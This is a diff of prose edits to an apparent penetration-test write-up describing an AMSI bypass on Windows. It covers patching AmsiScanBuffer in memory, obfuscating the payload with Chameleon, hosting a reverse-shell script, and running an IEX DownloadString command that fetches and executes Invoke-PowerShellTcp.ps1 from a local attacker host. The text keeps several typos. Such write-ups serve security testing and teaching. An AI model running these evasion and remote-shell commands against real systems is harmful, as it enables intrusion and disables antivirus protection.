@@ -80,9 +80,9 @@ $p = 0
 ```
 
 
-By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code, effectively avoiding the scanning of PowerShell code. This method allows the attacker's PowerShell code to execute without triggering AMSI's detection.
+By applying a patch to the `AmsiScanBuffer` function in `AMSI.dll`, using specific assembly code (mov eax, 0x80070057 and ret), the function promptly returns an error code. This effectively avoides AMSI from scanning the PowerShell code. This method allows the attacker's  to execute PowerShell code in memory without triggering AMSI's detection.
 
-However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before one could patch the `ASMIScanBuffer.dll` itself. Thus it is necessary to implement proper obfuscation methodologies before one delivers the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
+However, it is essential to acknowledge that the above memory patching payload might be flagged by ASMI before it could patch the `ASMIScanBuffer.dll` itself. Thus it is necessary to implement proper obfuscation methodologies before delivering the payload. To conceal the payload's content and intention, the tester opted to utilize Chameleon PowerShell Obfuscator. Chameleon is a specialized tool designed to obfuscate PowerShell scripts and circumvent AMSI and commercial antivirus solutions. It employs a range of obfuscation techniques to evade common detection signatures, thereby enhancing its effectiveness in avoiding detection. Examples of obfuscation methods include but are not limited to comment deletion/substitution
 string substitution (variables, functions, data-types) ,variable concatenation ,indentation randomization ,semi-random backticks insertion and randomization.
 
 The below code snippet contains a payload that has undergone multiple layers of obfuscation.
@@ -106,12 +106,12 @@ Add-Type $GFW2Au7XbmPG5GvoODmvtYOpODkUS2KZR095wx8IHiPJu4eatfAA885Px56TcF0MnqghrN
 ```
 
 
-After implementing effective obfuscation techniques, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
+After implementing effective obfuscation techniques, the payload is dropped in the PowerShell command prompt. The `ASMIScanBuffer.dll` returns an `Invalid Argument` and ends the AMSI program without being able to scan any code. With AMSI neutralized, the tester proceeded by hosting a Python web server on port 8443 to serve a PowerShell Reverse Shell Scrip.
 ```bash
 python3 -m http.server 8443
 ```
 
-Taking advantage of the AMSI.dll malfunction, the tester successfully initiated a reverse TCP connection via PowerShell, executing the following command in memory:
+Taking advantage of the payload, the tester successfully initiated a reverse TCP connection via PowerShell, executing the script in memory:
 ```bash
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke-PowerShellTcp.ps1')
 ```
